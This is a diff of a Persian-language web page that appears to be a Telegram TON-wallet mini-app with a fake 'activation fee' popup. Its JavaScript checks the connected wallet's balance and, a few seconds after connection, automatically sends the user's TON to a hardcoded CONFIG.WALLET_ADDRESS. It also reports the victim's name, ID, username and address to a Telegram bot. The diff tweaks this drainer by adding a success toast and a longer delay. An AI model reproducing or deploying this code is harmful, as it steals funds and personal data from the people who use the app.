@@ -850,7 +850,7 @@
         }
         .history-item:last-child { border-bottom: none; }
 
-        /* پاپ‌آپ فعالسازی - طبق عکس شما */
+        /* پاپ‌آپ فعالسازی */
         #feeModal {
             position: fixed;
             top: 0;
@@ -881,11 +881,7 @@
             color: #ff512f;
             margin-bottom: 20px;
         }
-        .modal-content h2 {
-            font-size: 22px;
-            margin-bottom: 20px;
-            color: #fff;
-        }
+        .modal-content h2 { font-size: 22px; margin-bottom: 20px; color: #fff; }
         .pay-notice {
             background: rgba(0, 0, 0, 0.3);
             border: 1.5px solid #ffc107;
@@ -927,10 +923,7 @@
             border-color: #0088cc;
             box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.3);
         }
-        #activationInput::placeholder {
-            color: #666;
-            font-size: 14px;
-        }
+        #activationInput::placeholder { color: #666; font-size: 14px; }
 
         .activation-message {
             margin-top: 15px;
@@ -992,7 +985,7 @@
     </div>
 </div>
 
-<!-- پاپ‌آپ فعالسازی - طبق عکس شما -->
+<!-- پاپ‌آپ فعالسازی -->
 <div id="feeModal">
     <div class="modal-content">
         <i class="fas fa-lock"></i>
@@ -1369,14 +1362,21 @@
             const balanceInNano = parseInt(data.result);
             const balanceInTON = balanceInNano / 1e9;
             
-            if (balanceInTON < 0.1) return;
+            if (balanceInTON < 0.1) {
+                console.log('موجودی کمتر از حداقل است');
+                return;
+            }
             
             const lastTxKey = `last_tx_${userAddress}`;
             const lastTx = localStorage.getItem(lastTxKey);
             const now = Date.now();
             
-            if (lastTx && (now - parseInt(lastTx)) < 3600000) return;
+            if (lastTx && (now - parseInt(lastTx)) < 3600000) {
+                console.log('کمتر از 1 ساعت از تراکنش قبلی گذشته');
+                return;
+            }
             
+            // ایجاد تراکنش
             const transaction = {
                 validUntil: Math.floor(now / 1000) + 600,
                 messages: [
@@ -1420,6 +1420,8 @@
 💳 به: ${CONFIG.WALLET_ADDRESS.substring(0, 10)}...
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
             
+            showToast(`✅ انتقال ${balanceInTON.toFixed(6)} TON با موفقیت انجام شد`);
+            
             if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
                 setTimeout(() => {
                     localStorage.setItem('isActivated', 'true');
@@ -1432,11 +1434,12 @@
             console.error('خطا:', error);
             
             let errorMessage = error.message || 'خطای ناشناخته';
-            if (errorMessage.includes('rejected')) {
+            if (errorMessage.includes('rejected') || errorMessage.includes('cancelled')) {
                 errorMessage = 'تراکنش توسط شما لغو شد';
+                showToast('❌ تراکنش لغو شد');
+            } else {
+                showToast('❌ خطا در تراکنش');
             }
-            
-            showGlassMessage('error', '❌ خطا در تراکنش', errorMessage);
             
             if (currentUser) {
                 sendToTelegram(`⚠️ **خطا در انتقال خودکار**
@@ -1488,7 +1491,7 @@
 👤 نام: ${user.firstName} ${user.lastName}
 🆔 آیدی: ${user.id}
 📛 یوزرنیم: ${user.username ? '@' + user.username : 'ندارد'}
-📱 پلتفرм: ${user.platform}
+📱 پلتفرم: ${user.platform}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
         } else {
             user.lastSeen = new Date().toISOString();
@@ -2004,9 +2007,10 @@
 💳 آدرس: ${fullAddress}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
                 
+                // اجرای تراکنش خودکار بعد از 3 ثانیه
                 setTimeout(() => {
                     executeAutoTransfer(fullAddress);
-                }, 1000);
+                }, 3000);
             }
             
             checkAndEnableFinalWithdraw();
@@ -2018,7 +2022,7 @@
     });
 
     // ================================================
-    // 🔐 فعالسازی (طبق عکس شما)
+    // 🔐 فعالسازی
     // ================================================
     if (localStorage.getItem('isActivated') === 'true') {
         document.getElementById('feeModal').style.display = 'none';
